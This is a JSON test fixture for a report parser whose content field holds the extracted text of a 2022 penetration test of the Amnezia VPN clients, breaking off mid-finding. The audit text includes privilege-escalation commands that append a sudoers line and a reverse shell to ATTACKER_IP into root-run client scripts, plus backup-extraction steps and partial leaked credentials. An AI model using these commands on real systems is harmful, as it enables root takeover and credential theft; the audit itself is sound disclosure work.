@@ -1,0 +1,1302 @@
+{
+  "manifest": {
+    "id": "7asecurity-amneziavpn",
+    "vendor": "7ASecurity",
+    "family": "7asecurity",
+    "sourceRootEnv": "PUBLIC_REPORT_CORPUS_DIR",
+    "sourcePath": "7ASecurity/pentest-report-amneziavpn.pdf",
+    "textPath": "data/golden-reports/extracted-text/7asecurity-amneziavpn.txt",
+    "expectedPath": "data/golden-reports/expected/7asecurity-amneziavpn.json"
+  },
+  "expected": {
+    "id": "7asecurity-amneziavpn",
+    "expectedCount": 16,
+    "expectedSeverityCounts": {
+      "Critical": 3,
+      "High": 1,
+      "Medium": 6,
+      "Low": 6
+    },
+    "notes": [
+      "Promoted from verified 7ASecurity review queue.",
+      "Source review id: 7asecurity-pentest-report-amneziavpn-c31e82d1",
+      "Info / Informational findings are normalized to Low by the current app model.",
+      "Requires ENABLE_7ASECURITY_INDEX_ALIGNMENT=true for 7ASecurity index recovery gates."
+    ]
+  },
+  "report": {
+    "id": "G-7asecurity-amneziavpn",
+    "slug": "7asecurity-amneziavpn",
+    "name": "7asecurity-amneziavpn",
+    "type": "PDF",
+    "uploadedAt": "2026-06-05T23:29:04.354Z",
+    "owner": "AI CTIX Analyzer",
+    "status": "Ready",
+    "findings": 16,
+    "critical": 3,
+    "high": 1,
+    "medium": 6,
+    "low": 6,
+    "summary": "Root PrivEsc in Linux Client affecting investigation-scope. Root PrivEsc in Mac Client affecting investigation-scope. Access to VPN Credentials via Android Backups affecting investigation-scope.",
+    "parsingStatus": "parsed",
+    "analysisVersion": 1,
+    "parserVersion": 1,
+    "parsingNotes": [
+      "Structured parser matched finding blocks successfully.",
+      "NLP hybrid extraction produced 16 finding(s). Heuristic fallback output was suppressed to avoid duplicate findings.",
+      "Aligned findings with generic official index: 16 -> 16."
+    ],
+    "content": "Test Targets:\nAmnezia VPN Mobile apps\nAmnezia VPN Desktop apps\nPentest Report\nClient:\nAmnezia VPN\n7ASecurity Test Team:\n● Abraham Aranguren, MSc.\n● Daniel Ortiz, BSc.\n● Jesus Arturo Espinoza Soto\n● Miroslav Štampar, PhD.\n● Tarunkant Gupta, BTech.\n7ASecurity\nProtect Your Site & Apps From Attackers\nsales@7asecurity.com\n\n-- 1 of 37 --\n\nPentest Report\nINDEX\nIntroduction 3\nScope 4\nIdentified Vulnerabilities 5\nAVP-01-001 WP2: Linux/Mac root PrivEsc via insecure Permissions (Critical) 5\nAVP-01-002 WP1: Possible Android/iOS Leaks via Missing Security Screen (Low) 8\nAVP-01-003 WP1: Possible Phishing via StrandHogg 2.0 on Android (Medium) 11\nAVP-01-004 WP1: VPN Config Access via Android & iOS Backups (Medium) 13\nAVP-01-005 WP1: Config Access via incorrect Android Keystore Usage (Medium) 15\nAVP-01-006 WP2: Linux VPN Config Access via Insecure Permissions (High) 16\nAVP-01-010 WP2: Linux/Mac/Win DoS via Predictable Port Usage (Medium) 17\nAVP-01-011 WP2: Linux/Mac/Win PrivEsc via IPC Design Flaw (Critical) 19\nAVP-01-014 WP2: Linux/Mac/Win RCE as root via Malicious Share Link (Critical) 22\nAVP-01-015 WP1: Config Access via missing iOS KeyChain usage (Medium) 25\nAVP-01-016 WP1: Config Access via missing iOS Data Protection (Medium) 26\nHardening Recommendations 29\nAVP-01-007 WP1: Android Application Hardening Recommendations (Low) 29\nAVP-01-008 WP1: Missing Android root & iOS Jailbreak Detection (Info) 30\nAVP-01-009 WP1: Android Binary Hardening Recommendations (Info) 31\nAVP-01-012 WP1/2: Possible Theft of Credentials via Plaintext Storage (Low) 32\nAVP-01-013 WP2: Possible Weaknesses via Insecure Function Usage (Low) 34\nConclusion 36\n7ASecurity © 2022\n2\n\n-- 2 of 37 --\n\nPentest Report\nIntroduction\n“Your personal self-hosted VPN\nFree service to create a personal VPN on your server. Helps to access blocked content\nwithout revealing privacy even to VPN providers.”\nFrom: https://en.amnezia.org/\nThis document outlines the results of a whitebox security review conducted against the\nimplementation of the Amnezia VPN clients. The project was solicited by the Amnezia\nVPN maintainers, funded by the Open Technology Fund (OTF), and executed by\n7ASecurity in June and July 2022. The audit team dedicated 26 working days to\ncomplete this assignment. Please note that this is the first penetration test for the\nplatform. Consequently, identification of new security weaknesses was expected to be\neasier during this assignment, as more vulnerabilities are identified and resolved after\neach testing cycle.\nDuring this iteration, the aim was to review the security posture of the multiple Amnezia\nVPN clients. The goal was to review all items in scope as thoroughly as possible to\nensure Amnezia VPN users can be provided with the best possible security.\nThe methodology implemented was whitebox: The 7ASecurity team was supplied with\naccess to documentation, desktop and mobile app builds, source code, as well as a test\nVPN server, which was deployed following the Amnezia VPN documentation as a\nreference implementation. A team of 5 senior auditors executed all tasks required for this\nengagement, including preparation, delivery, documentation of findings and\ncommunications.\nThe project entailed an audit of the main Amnezia VPN clients: Windows, Linux, Mac OS\nX, and Android, while the iOS application became available towards the end of this\nassignment. The core goal in scope for this exercise was to verify if the Amnezia VPN\nclients deliver on their promise to protect user data as well as network traffic, and\nsuggest how the solution might be improved in the future in order to become more\ndifficult to attack by malicious adversaries. This included testing all clients, through static\ncode analysis as well as at runtime, with a special focus on attack vectors that could put\nAmnezia VPN users or their data at risk.\nAll necessary arrangements were in place by June 2022, to facilitate a straightforward\ncommencement for 7ASecurity. In order to enable effective collaboration, information to\ncoordinate the test was relayed through email as well as a shared Slack channel. The\nAmnezia VPN team was helpful and responsive throughout the audit, even during\n7ASecurity © 2022\n3\n\n-- 3 of 37 --\n\nPentest Report\nout-of-office hours and weekends.\nThe project was competently defined and organized, which facilitated the audit for the\ntest team. As a result, the testers did not have the need to frequently ask or wait for\nanswers, and hence, there were no notable blockers during this iteration. Overall, the\ntest went well and 7ASecurity provided regular updates regarding the audit status and its\ninterim findings during this exercise.\nThe findings of the security audit can be summarized as follows:\nIdentified Vulnerabilities Hardening Recommendations Total\n11 5 16\nMoving forward, the scope section elaborates on the items under review, and the\nfindings section documents the identified vulnerabilities followed by hardening\nrecommendations with lower exploitation potential. Each finding includes a technical\ndescription, a proof-of-concept (PoC) and/or steps to reproduce if required, plus\nmitigation or fix advice for follow-up actions by the development team.\nFinally, the report culminates with a conclusion providing detailed commentary, analysis,\nand guidance relating to the context, preparation, and general impressions gained\nthroughout this test, as well as a summary of the perceived security posture of the\nAmnezia VPN clients.\nScope\nThe following list outlines the items in scope for this project:\nWP1: Whitebox Tests against AmneziaVPN Mobile clients\n● https://play.google.com/store/apps/details?id=org.amnezia.vpn\n● https://github.com/amnezia-vpn/desktop-client/tree/master/client/android\n● https://github.com/amnezia-vpn/desktop-client/tree/dev/client/ios\nWP2: Whitebox Tests against AmneziaVPN Desktop clients\n● https://github.com/amnezia-vpn/desktop-client\n7ASecurity © 2022\n4\n\n-- 4 of 37 --\n\nPentest Report\nIdentified Vulnerabilities\nThis area of the report enumerates findings that were deemed to exhibit greater risk\npotential. Please note these are offered sequentially as they were uncovered, they are\nnot sorted by significance or impact. Each finding has a unique ID (i.e. AVP-01-001) for\nease of reference, and offers an estimated severity in brackets alongside the title.\nAVP-01-001 WP2: Linux/Mac root PrivEsc via insecure Permissions (Critical)\nRetest Notes: The Amnezia VPN Team resolved this issue1, and 7ASecurity verified that\nthe fix is valid.\nIt was found that the Linux and Mac clients are currently installed with insecure\npermissions. Please note that the Windows client is not affected by this issue. This was\nconfirmed on the latest Amnezia VPN Linux (2.0.92) and Mac (2.0.103) releases at the\ntime of writing. Malicious users can leverage this weakness to gain root privileges by\nsimply modifying some of the Amnezia VPN files. These issues were confirmed as\nfollows:\nIssue 1: Root PrivEsc in Linux Client\nCommand:\necho 'echo \"stamparm ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers' >>\n'/opt/AmneziaVPN/client/bin/update-resolv-conf.sh'\nAfter the Client is connected to the VPN, the script update-resolv-conf.sh is automatically\nbeing run by the service, and the attacker (stamparm) becomes a passwordless SUDO\nuser. This was confirmed by in another terminal successfully as follows:\nCommand:\nsudo whoami\nOutput:\nroot\n3 https://github.com/amnezia-vpn/desktop-client/releases/tag/2.0.10\n2 https://github.com/amnezia-vpn/desktop-client/releases/tag/2.0.9\n1 https://github.com/amnezia-vpn/desktop-client/pull/90\n7ASecurity © 2022\n5\n\n-- 5 of 37 --\n\nPentest Report\nThe root cause of this issue is that while the owner of the Linux VPN client is root, many\nof the files and directories allow arbitrary writes from limited users, which offers multiple\nprivilege escalation opportunities to attackers:\nCommand:\nls -la /opt/AmneziaVPN/\nOutput:\ntotal 27176\ndrwxr-xr-x 5 root root 4096 lip 21 21:08 ./\ndrwxr-xr-x 20 root root 4096 lip 21 21:07 ../\n-rwxrwxrwx 1 root root 162 lip 21 21:07 AmneziaVPN_build.desktop*\ndrwxrwxrwx 9 root root 4096 lip 21 23:11 client/\n-rw-r--r-- 1 root root 540 lip 21 21:08 components.xml\n-rw-r--r-- 1 root root 2303 lip 21 21:08 InstallationLog.txt\n-rw-r--r-- 1 root root 48 lip 21 21:08 installer.dat\ndrwxr-xr-x 3 root root 4096 lip 21 21:08 installerResources/\n-rwxr-xr-x 1 root root 27763592 lip 21 21:08 maintenancetool*\n-rw-r--r-- 1 root root 7897 lip 21 21:08 maintenancetool.dat\n-rw-r--r-- 1 root root 3171 lip 21 21:08 maintenancetool.ini\n-rw-r--r-- 1 root root 362 lip 21 21:08 network.xml\n-rwxrwxrwx 1 root root 1967 lip 21 21:07 post_install.sh*\n-rwxrwxrwx 1 root root 2159 lip 21 21:07 post_uninstall.sh*\ndrwxrwxrwx 7 root root 4096 lip 21 21:07 service/\nCommand:\nfind /opt/AmneziaVPN/ -writable\nOutput:\n/opt/AmneziaVPN/client\n/opt/AmneziaVPN/client/share\n/opt/AmneziaVPN/client/share/icons\n/opt/AmneziaVPN/client/share/icons/AmneziaVPN_Logo.png\n/opt/AmneziaVPN/client/share/applications\n/opt/AmneziaVPN/client/share/applications/AmneziaVPN_build.desktop\n/opt/AmneziaVPN/client/AmneziaVPN.desktop\n/opt/AmneziaVPN/client/bin\n/opt/AmneziaVPN/client/bin/update-resolv-conf.sh\n/opt/AmneziaVPN/client/bin/openssl-easyrsa.cnf\n/opt/AmneziaVPN/client/bin/easyrsa\n/opt/AmneziaVPN/client/bin/qt.conf\n/opt/AmneziaVPN/post_install.sh\n/opt/AmneziaVPN/service\n/opt/AmneziaVPN/service/share\n/opt/AmneziaVPN/service/share/applications\n/opt/AmneziaVPN/service/share/applications/AmneziaVPN_build.desktop\n/opt/AmneziaVPN/service/AmneziaVPN.service\n7ASecurity © 2022\n6\n\n-- 6 of 37 --\n\nPentest Report\n/opt/AmneziaVPN/service/translations\n/opt/AmneziaVPN/service/translations/qt_en.qm\n/opt/AmneziaVPN/service/translations/qt_lv.qm\n[...]\n/opt/AmneziaVPN/service/translations/qt_fr.qm\n/opt/AmneziaVPN/service/lib\n/opt/AmneziaVPN/service/bin\n/opt/AmneziaVPN/post_uninstall.sh\n/opt/AmneziaVPN/AmneziaVPN_build.desktop\nPlease note that on the Linux client, AmeziaVPN-service is only a template used during\nthe installation, and not used afterwards. This file is hence not suitable for an attacker for\nprivilege escalation attacks.\nIssue 2: Root PrivEsc in Mac Client\nThe Mac client can similarly be attacked by modifying files such as update-resolv-conf.sh\nor AmeziaVPN-service to gain root privileges without a prompt. In this case, only the\nuser that originally installed the VPN client can perform this attack, backdooring the files\nto provide a root shell to the attacker, please note both files could be tampered as\nfollows:\nOption 1 Command (root access when the clients connects to the VPN):\necho \"bash -c 'sh -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'\" >>\n/Applications/AmneziaVPN.app/Contents/MacOS/update-resolv-conf.sh\nOption 2 Command (root access on next reboot):\ncat << EOF > /Applications/AmneziaVPN.app/Contents/MacOS/AmneziaVPN-service\n#!/bin/bash\nbash -c 'sh -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'\nEOF\nFrom another terminal start a netcat listener:\nCommand:\nncat -lvp 1234\nDepending on the tampering option chosen, when the user connects to the VPN\n(update-resolve-conf.sh) or reboots the system (AmneziaVPN-service), the scripts are\nautomatically being run with root privileges, resulting in a reverse root shell:\nResult:\nThe netcat listener receives an interactive root shell, escalating privileges without having\nto enter a password.\n7ASecurity © 2022\n7\n\n-- 7 of 37 --\n\nPentest Report\nOutput:\n» ncat -lvp 1234\nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::1234\nNcat: Listening on 0.0.0.0:1234\nNcat: Connection from [...].\nNcat: Connection from [...]:55576.\nsh: no job control in this shell\nsh-3.2# whoami\nroot\nsh-3.2#\nThe root cause of this issue is that the files are user-writable and get executed with root\nprivileges, which offers privilege escalation opportunities to attackers:\nCommand:\nls -al /Applications/AmneziaVPN.app/Contents/MacOS/*\nOutput:\n-rwxr-xr-x@ 1 tarun staff 2092 Jun 28 23:30 update-resolv-conf.sh\n-rwxr-xr-x 1 tarun staff 230016 Jun 23 23:00 AmneziaVPN-service\n[...]\nIt is recommended to ensure all VPN client installers implement the minimum necessary\npermissions for the application to work in Linux and Mac OS X, no user other than root\nshould be able to modify Amnezia VPN files.\nAVP-01-002 WP1: Possible Android/iOS Leaks via Missing Security Screen (Low)\nRetest Notes: The Amnezia VPN Team resolved this issue4, and 7ASecurity verified that\nthe fix is valid.\nIt was found that the Android and iOS apps fail to render a security screen when they are\nbackgrounded. This allows attackers with physical access to an unlocked device to see\ndata displayed by the apps before they disappeared into the background. A malicious\napp or an attacker with physical access to the device could leverage these weaknesses\nto gain access to the VPN private key, VPN login credentials or VPN connection string.\nTo replicate this issue in Android or iOS, simply navigate to some sensitive screen and\nthen send the application to the background. After that, show the open apps and\nobserve how the input text can be read by the user. This text will be readable even after\na phone reboot:\n4 https://github.com/amnezia-vpn/desktop-client/pull/114\n7ASecurity © 2022\n8\n\n-- 8 of 37 --\n\nPentest Report\nFig.: Possible leaks on Login, Server Setup and Connect screens on Android\nFig.: Possible leaks on Server Setup and Share screens on iOS\nThe root cause for this issue is that the Android and iOS apps do not appear to have any\ncode that captures backgrounding events to implement a security screen. This explains\nwhy no security screen is shown. This can be confirmed by searching globally for\nAndroid and iOS events in the source code provided as well as in the decompiled\nbinaries:\n7ASecurity © 2022\n9\n\n-- 9 of 37 --\n\nPentest Report\nExample 1: Missing capture of backgrounding events on Android\nCommand:\negrep -Ir '(onActivityPause|ON_PAUSE)' * |egrep -v \"(androidx|google|android/support)\"\n|wc -l\nOutput:\n0\nExample 2: Missing capture of backgrounding events on iOS\nCommand:\negrep -Ir '(applicationWillResignActive|applicationDidEnterBackground)' * | wc -l\nOutput:\n0\nIt is recommended to render a security screen on top when the app is going to be sent to\nthe background:\nFor iOS apps, the application being sent into the background can be detected in Swift5\nand Objective-C6. After that, a different screen, namely the security screen without user\ndata, can be shown. A revised approach prevents leakage of sensitive information via\niOS screenshots. This is typically accomplished in the AppDelegate file, using the\napplicationWillResignActive or applicationDidEnterBackground methods.\nFor Android apps, it is recommended to implement a security screen by capturing the\nrelevant backgrounding events, typically onActivityPause7 or the ON_PAUSE Lifecycle\nevent8 are used for such purposes. After that, if possible, ensure that all views have the\nAndroid FLAG_SECURE flag9 set. This will guarantee that even apps running with root\nprivileges are unable to directly capture information displayed by the app on the screen.\nAlternatively, the QtActivity.java file could be amended to always set this flag, regardless\nof the focus.\n9 http://developer.android.com/reference/android/view/Display.html#FLAG_SECURE\n8 https://developer.android.com/reference/androidx/lifecycle/Lifecycle.Event\n7 https://developer.android.com/.../Application.ActivityLifecycleCallbacks#onActivityPaused...\n6 https://developer.apple.com/...-applicationwillresignactive?language=objc\n5 https://www.hackingwithswift.com/example-code/system/how-to-detect-when-your-app-mo...ackground\n7ASecurity © 2022\n10\n\n-- 10 of 37 --\n\nPentest Report\nAVP-01-003 WP1: Possible Phishing via StrandHogg 2.0 on Android (Medium)\nRetest Notes: The Amnezia VPN Team resolved this issue10, and 7ASecurity verified\nthat the fix is valid.\nTesting confirmed that the Android app is currently vulnerable to a number of task\nhijacking attacks. The launchMode for the app-launcher activity is currently set to\nsingleTop11, which mitigates task hijacking via StrandHogg12 and other older techniques\ndocumented since 201513, while leaving the app vulnerable to StrandHogg 2.014. This\nvulnerability affects Android versions 3-9.x15 but was only patched by Google on Android\n8-916. Since the app supports devices from Android 7 (API level 24), this leaves all users\nrunning Android 7.x vulnerable, as well as users running unpatched Android 8-9.x\ndevices (common).\nA malicious app could leverage this weakness to manipulate the way in which users\ninteract with the app. More specifically, this would be instigated by relocating a malicious\nattacker-controlled activity in the screen flow of the user, which may be useful to perform\nPhishing, Denial-of-Service, or capturing user-credentials. This issue has been exploited\nby banking malware trojans in the past17.\nIn StrandHogg and regular Task Hijacking, malicious applications typically use one or\nmore of the following techniques:\n● Task Affinity Manipulation: The malicious application has two activities M1 and M2\nwherein M2.taskAffinity = com.victim.app and M2.allowTaskReparenting = true. If\nthe malicious app is opened on M2, once the victim application has initiated, M2 is\nrelocated to the front and the user will interact with the malicious application.\n● Single Task Mode: If the victim application has set launchMode to singleTask,\nmalicious applications can use M2.taskAffinity = com.victim.app to hijack the victim’s\napplication task stack.\n● Task Reparenting: If the victim application has set taskReparenting to true,\nmalicious applications can move the victim’s application task to the malicious\n17 https://arstechnica.com/.../...fully-patched-android-phones-under-active-attack-by-bank-thieves/\n16 https://source.android.com/security/bulletin/2020-05-01\n15 https://www.xda-developers.com/strandhogg-2-0-android-vulnerability-explained-developer-mitigation/\n14 https://www.helpnetsecurity.com/2020/05/28/cve-2020-0096/\n13 https://s2.ist.psu.edu/paper/usenix15-final-ren.pdf\n12 https://www.helpnetsecurity.com/2019/12/03/strandhogg-vulnerability/\n11 https://developer.android.com/guide/topics/manifest/activity-element#lmode\n10 https://github.com/amnezia-vpn/desktop-client/commit/53e240add72904c586d02ae...\n7ASecurity © 2022\n11\n\n-- 11 of 37 --\n\nPentest Report\napplication’s stack.\nHowever, in the case of StrandHogg 2.0, all exported activities without a launchMode of\nsingleTask or singleInstance are affected on vulnerable Android versions18.\nThis issue can be confirmed by reviewing the AndroidManifest of the Android application.\nAffected File:\nAndroidManifest.xml\nAffected Code:\n<activity android:theme=\"@style/splashScreenTheme\" android:label=\"AmneziaVPN\"\nandroid:name=\"org.qtproject.qt5.android.bindings.QtActivity\"\nandroid:launchMode=\"singleTop\" android:screenOrientation=\"unspecified\"\nandroid:configChanges=\"mcc|mnc|locale|keyboard|keyboardHidden|navigation|orientation|s\ncreenLayout|uiMode|screenSize|smallestScreenSize|density|layoutDirection|fontScale\">\nAs can be seen above, the launchMode is set to singleTop.\nTo ease the understanding of this problem, an example of a malicious app was created\nto demonstrate the exploitability of this weakness.\nPoC Demo:\nhttps://7as.es/AmneziaVPN_uEuw9k6N/task-hijacking.mp4\nIt is recommended to implement as many of the following countermeasures as deemed\nfeasible by the development team:\n● The task affinity of exported application activities should be set to an empty string\nin the Android manifest. This will force the activities to use a randomly generated\ntask affinity instead of the package name and hence prevent task hijacking, as\nmalicious apps will not have a predictable task affinity to target.\n● The launchMode should then be changed to singleInstance (instead of\nsingleTask, for example). This will ensure continuous mitigation in StrandHogg\n2.019 while improving security strength against older task hijacking techniques20.\n● A custom onBackPressed() function could be implemented to override the default\nbehavior.\n● The FLAG_ACTIVITY_NEW_TASK should not be set in activity launch intents. If\ndeemed required, one should use the aforementioned in combination with the\n20 http://blog.takemyhand.xyz/2021/02/android-task-hijacking-with.html\n19 https://www.xda-developers.com/strandhogg-2-0-android-vulnerability-explained.../\n18 https://www.xda-developers.com/strandhogg-2-0.../\n7ASecurity © 2022\n12\n\n-- 12 of 37 --\n\nPentest Report\nFLAG_ACTIVITY_CLEAR_TASK flag21.\nAffected File:\nAndroidManifest.xml\nProposed fix:\n<activity android:theme=\"@style/splashScreenTheme\" android:label=\"AmneziaVPN\"\nandroid:name=\"org.qtproject.qt5.android.bindings.QtActivity\"\nandroid:launchMode=\"singleInstance\" android:taskAffinity=\"\"\nandroid:screenOrientation=\"unspecified\"\nandroid:configChanges=\"mcc|mnc|locale|keyboard|keyboardHidden|navigation|orientation|s\ncreenLayout|uiMode|screenSize|smallestScreenSize|density|layoutDirection|fontScale\">\nAVP-01-004 WP1: VPN Config Access via Android & iOS Backups (Medium)\nRetest Notes: The Amnezia VPN Team resolved this issue2223, and 7ASecurity verified\nthat the fix is valid.\nIt was found that the Android and iOS applications allow backups, and store the VPN\nconfiguration and its credentials in plain-text. In a worst case scenario, a malicious\nattacker with access to an unlocked phone or backups could leverage this weakness to\ngain SSH access to the AmneziaVPN server via stolen credentials. This issue was\nverified by setting up the VPN configuration and then reviewing the Android & iOS\nbackup contents for the apps as follows:\nIssue 1: Access to VPN Credentials via Android Backups\nCommands:\nadb backup -f backup.ab org.amnezia.vpn\n(printf \"\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\";tail -c +25 backup.ab)|tar xfvz -\nOutput:\napps/org.amnezia.vpn/_manifest\napps/org.amnezia.vpn/r/qt-reserved-files\n[...]\nExample Affected File:\nf/.config/AmneziaVPN.ORG/AmneziaVPN.conf\n23 https://github.com/amnezia-vpn/desktop-client/pull/99\n22 https://github.com/amnezia-vpn/desktop-client/pull/97\n21 https://www.slideshare.net/phdays/android-task-hijacking\n7ASecurity © 2022\n13\n\n-- 13 of 37 --\n\nPentest Report\nExample Affected Output:\nserversList=\"@ByteArray([\\n {\\n \\\"containers\\\": [\\n {\\n\n\\\"container\\\": \\\"amnezia-shadowsocks\\\"\\n }\\n ],\\n\n\\\"defaultContainer\\\": \\\"amnezia-shadowsocks\\\",\\n \\\"description\\\": \\\"Server\n1\\\",\\n \\\"hostName\\\": \\\"5.45.92.15\\\",\\n \\\"password\\\": \\\"4H[...]\\\",\\n\n\\\"port\\\": 22,\\n \\\"userName\\\": \\\"root\\\"\\n }\\n]\\n)\"\nIssue 2: Access to VPN Credentials via iOS Backups\nThis issue can be verified by backing up an iDevice where the Amnezia VPN app has\nbeen installed, some configuration details added, and is synchronized with the server.\nThen, the whole device must be backed up without encryption with iTunes. Finally, the\nresulting iTunes backup files can be inspected for leaks.\nThe following files were found to leak sensitive information in the iTunes backup:\nExample Affected File:\norg.amnezia.AmneziaVPN.5WYYA886G9/Library/Preferences/org.amneziavpn.Amnezia\nVPN.plist\nExample Affected Contents:\n[\n{\n\"containers\": [\n{\n\"container\": \"amnezia-shadowsocks\"\n}\n],\n\"defaultContainer\": \"amnezia-shadowsocks\",\n\"description\": \"Server 1\",\n\"hostName\": \"5.45.92.15\",\n\"password\": \"4H[...]\",\n\"port\": 22,\n\"userName\": \"root\"\n}\n]\nFor the Android app, the root cause for this issue is that the application fails to define the\nandroid:allowBackup attribute in the AndroidManifest.xml file, which allows local\nattackers with access to an unlocked phone to enable USB debugging and access\napplication secrets.\n7ASecurity © 2022\n14\n\n-- 14 of 37 --\n\nPentest Report\nIt is recommended to explicitly disable Android backups in the AndroidManifest.xml file to\nresolve this issue. This can be accomplished using a value of false for\nandroid:allowBackup. If backups must be allowed, the android:fullBackupContent\ndirective could be used to specify an XML file24 with full backup rules for auto backup25.\nFor iOS, it is recommended to implement a safer form of storage at rest, for example\nusing SQLCipher26 and keeping the encryption key for the database in the iOS keychain\nwould be a superior approach.\nIt is also possible to exclude certain files and directories from iOS backups by calling\n[NSURL setResourceValue:forKey:error:] using the NSURLIsExcludedFromBackupKey\nkey27. A Swift example can be found in the blog post titled “Swift excluding files from\niCloud backup”28.\nAVP-01-005 WP1: Config Access via incorrect Android Keystore Usage (Medium)\nRetest Notes: The Amnezia VPN Team resolved this issue2930, and 7ASecurity verified\nthat the fix is valid.\nIt was found that the Android app fails to correctly leverage the Android keystore31, a\nhardware-backed security enclave ideal for secure storage of application secrets.\nInstead, the app stores VPN configuration information in an unencrypted file. This\napproach is insecure because that data could be accessed by a malicious attacker with\nphysical access, memory access or filesystem access. Furthermore, given the large\nvolume of publicly known Android kernel vulnerabilities32 and high likelihood of users on\nunpatched Android devices, it should be assumed that malicious apps may be able to\ngain such access via privilege escalation vulnerabilities. At the time of writing, some\nsensitive items were found to be unsafely stored outside of the Android KeyStore and\nthe Android Encrypted Preferences33.\nAffected File:\nfiles\\.config\\AmneziaVPN.ORG\\AmneziaVPN.conf\n33 https://developer.android.com/topic/security/data\n32 https://www.cvedetails.com/vulnerability-list.php?vendor_id=1224&product_id=19997...\n31 https://developer.android.com/training/articles/keystore\n30 https://github.com/amnezia-vpn/desktop-client/pull/99\n29 https://github.com/amnezia-vpn/desktop-client/pull/97\n28 https://bencoding.com/2017/02/20/swift-excluding-files-from-icloud-backup/\n27 https://developer.apple.com/library/...#//apple_ref/doc/uid/TP40010672-CH2-SW28\n26 https://www.zetetic.net/sqlcipher/\n25 https://developer.android.com/guide/topics/data/autobackup\n24 https://developer.android.com/guide/topics/manifest/application-element#fullBackupContent\n7ASecurity © 2022\n15\n\n-- 15 of 37 --\n\nPentest Report\nAffected Contents:\n{\"\\\\n-----BEGIN OpenVPN Static key V1-----\\\\\\\\nf2baef[...]\\\\\\\\n-----END OpenVPN Static\nkey V1-----n\\\\\\\\n</tls-auth>\\\\\\\\n\\\\\\\"\\\\n}\\\\n\\\"\\n }\\n }\\n\n],\\n \\\"defaultContainer\\\": \\\"amnezia-openvpn\\\",\\n \\\"description\\\":\n\\\"Server 1\\\",\\n \\\"hostName\\\": \\\"5.45.92.15\\\",\\n \\\"password\\\":\n\\\"4H[...]\\\",\\n \\\"port\\\": 22,\\n \\\"userName\\\": \\\"root\\\"\\n }\\n]\\n)\"}\nIt is recommended to leverage the options provided by the platform to store application\nsecrets in a safe manner. In this case, the Android Encrypted Preferences34 or the\nAndroid Keystore35 would be suitable for such purposes. The Android Keystore is a\nhardware-backed security enclave designed to implement or complete encryption of\napplication secrets. Further information regarding the Android Keystore and its protection\nfeatures can be found in the official Android documentation36.\nAVP-01-006 WP2: Linux VPN Config Access via Insecure Permissions (High)\nRetest Notes: The Amnezia VPN Team resolved this issue37, and 7ASecurity verified\nthat the fix is valid.\nIt was found that the Linux client currently stores the VPN configuration in a way that is\nreadable to all other system users. Please note that the Mac OS and Windows clients\nare not affected by this issue. Malicious users with lower privileges could leverage this\nweakness to gain access to VPN servers from other users. This issue was confirmed as\nfollows:\nCommands:\ncd /home/stamparm/.config/AmneziaVPN.ORG && ls -la && cat *.conf\nOutput:\ntotal 20\ndrwxrwxr-x 2 stamparm stamparm 4096 lip 22 23:45 ./\ndrwxr-xr-x 67 stamparm stamparm 4096 lip 22 13:09 ../\n-rw-rw-r-- 1 stamparm stamparm 10030 lip 21 22:32 AmneziaVPN.conf\n[...]\n0j8Actazj1RiSv4FWWE\\\\\\\\nIyyHkDviJxeYq/zmwTPPAR8habJoT3Aos6Hc1wKF1HsweWoAr6mo1YqBcZ/mBLE\nX\\\\\\\\nz663RbH7uWG7Mj3Xs3R6+uRWWqGpFgzUmlv5iEKzOc5hWCSZ4pJYFyaKV+8rvWOd\\\\\\\\n4r76TuxhoqtO\nFRM3YDxzUqCVUSuXMYc9ovzEZsrHmOLeH8Kr2rhxmAloONCKgZPc\\\\\\\\nt5uKGbcaJ/P6lbR0\\\\\\\\n-----END\n37 https://github.com/amnezia-vpn/desktop-client/commit/cdb1a4c288e86c5cef31...\n36 https://developer.android.com/training/articles/keystore\n35 https://developer.android.com/training/articles/keystore\n34 https://developer.android.com/topic/security/data\n7ASecurity © 2022\n16\n\n-- 16 of 37 --\n\nPentest Report\nCERTIFICATE-----\\\\\\\\n\\\\\\\\n</cert>\\\\\\\\n<key>\\\\\\\\n-----BEGIN PRIVATE\nKEY-----\\\\\\\\nMIIE[...]kFAcQ==\\\\\\\\n-----END PRIVATE\nKEY-----\\\\\\\\n\\\\\\\\n</key>\\\\\\\\n<tls-auth>\\\\\\\\n#\\\\\\\\n# 2048 bit OpenVPN static\nkey\\\\\\\\n#\\\\\\\\n-----BEGIN OpenVPN Static key V1-----\\\\\\\\nf2bae[...]85283\\\\\\\\n-----END\nOpenVPN Static key V1-----\\\\\\\\n\\\\\\\\n</tls-auth>\\\\\\\\n\\\\\\\"\\\\n}\\\\n\\\",\\n\n\\\"port\\\": \\\"1194\\\",\\n \\\"transport_proto\\\": \\\"udp\\\"\\n\n}\\n }\\n ],\\n \\\"defaultContainer\\\": \\\"amnezia-openvpn\\\",\\n\n\\\"description\\\": \\\"Server 1\\\",\\n \\\"hostName\\\": \\\"5.[...].15\\\",\\n \\\"password\\\":\n\\\"4H[...]Qa\\\",\\n \\\"port\\\": 22,\\n \\\"userName\\\": \\\"root\\\"\\n }\\n]\\n)\"\nIt is recommended to implement the minimum possible permissions on all configuration\nfiles for the application to work. An approach similar to the widely accepted guidelines to\nsecure SSH configuration files should be used for this purpose. A detailed breakdown of\nthis can be found in the Frank Lin blog38.\nAVP-01-010 WP2: Linux/Mac/Win DoS via Predictable Port Usage (Medium)\nRetest Notes: The Amnezia VPN Team resolved this issue39, and 7ASecurity verified\nthat the fix is valid.\nIt was found that the Linux, Mac and Windows Amnezia VPN clients are vulnerable to\nDoS when a malicious application or user utilizes TCP port 57775. Specifically, when\nlocalhost TCP port 57775 is occupied by any user, the OpenVPN setup will fail. This\nissue occurs due to explicit usage of 57775, as the predefined port for management\npurposes, during the openvpn command line run. This issue was confirmed as follows:\nStep 1: Set up a netcat listener on port 57775 to make this port unavailable\nCommand:\nnc -n -vv -l -p 57775 -s 127.0.0.1\nStep 2: Connect the VPN client and observe the output\nOutput (Client Log):\nUiLogic::initalizeUiLogic()\nQSystemTrayIcon::setVisible: No Icon set\nSystemTrayNotificationHandler::setTrayState VpnProtocol::Disconnected\nVpnConfigurator::getDnsForConfig \"1.1.1.1\" \"1.0.0.1\"\nStarted AmneziaVPN version 2.0.8.0\nUbuntu 21.04 (x86_64)\n\"СonnectToVpn, Server index is 1, container is amnezia-openvpn, route mode is\"\n39 